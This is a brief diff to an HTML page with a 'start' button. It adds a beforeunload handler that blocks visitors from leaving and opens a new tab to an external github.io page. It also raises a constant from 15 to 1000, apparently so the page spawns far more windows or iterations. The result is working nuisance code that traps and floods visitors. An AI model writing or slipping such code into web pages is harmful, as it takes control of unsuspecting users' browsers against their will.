@@ -19,9 +19,14 @@
   <button onclick="winow()">start</button>
 
   <script>
+    window.addEventListener('beforeunload', function (e) {
+      e.preventDefault();
+      e.returnValue = '';
+      window.open('https://flakka736.github.io/nickle/hey.html', '_blank');
+    });
     function winow() {
       const now = 10;
-      const br = 15;
+      const br = 1000;
       const rs = 50;
       const speed = 90;
 
